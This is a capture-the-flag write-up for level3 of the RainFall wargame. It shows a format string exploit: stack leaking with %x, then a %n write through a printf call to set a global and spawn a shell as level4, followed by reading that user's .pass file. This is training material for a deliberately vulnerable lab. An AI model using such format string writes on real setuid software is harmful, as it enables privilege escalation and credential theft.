# Level3

As in level2, we can find an executable waiting for an input, print it and quit after press enter
```
level3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
level3@RainFall:~$ ./level3
bla
bla
level3@RainFall:~$
```
After analyze it with gdb we can see that the `main()` function call a function named `v()`.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-RainFall/blob/main/level3/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-RainFall/blob/main/level3/source.c) for more details.  
Let focus on the `v()` function.  
We can see a call to `fgets()` function wich is protect against buffer overflow attack.  
```
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
```
But we can also see a call to `printf()` function wich is vulnerable to format string exploit!  
```
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
```
After that the program compares the value of a global variable `m` at "0x804988c" to 64.  
If the comparaison return true then the function will print "Wait what?!\n" and launch a shell via a call to `system()`.  
We need to manipulate `printf()` function into changing the value of the variable at the address `0x804988c`.  
First we need to print the memory until we reach the address of the variable we wish to modify :
```
level3@RainFall:~$ python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit | ./level3
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
level3@RainFall:~$
```
Our buffer `aaaa` is at the 4th position (`61616161`). The modifier format `%x` allow us to print address on the stack, cast on unsigned hexadecimal integer ([man printf](http://manpagesfr.free.fr/man/man3/printf.3.html))  
Now we can replace our buffer `aaaa` by the address of the variable `m` in little endian.
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit | ./level3
 200 b7fd1ac0 b7ff37d0 804988c
level3@RainFall:~$
```
Good, the only last thing to do is that we don't want to print the memory, we want to change the content of the variable `m`.  
Don't forget that the variable `m` must have 64 bytes so we just have to add 60 bytes to the address passed before.  
The modifier `%n` will write the number of bytes specified before in the choosen address. We can specify the address with %[number]$n option.  
Finally our final format string attack will look like :
- address of `m`        : 4 bytes
- pad of arbitrary data : 60 bytes
- modifier `%n`
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit - | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
^C
level3@RainFall:~$ su level4
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
level4@RainFall:~$
```
Level3 passed!
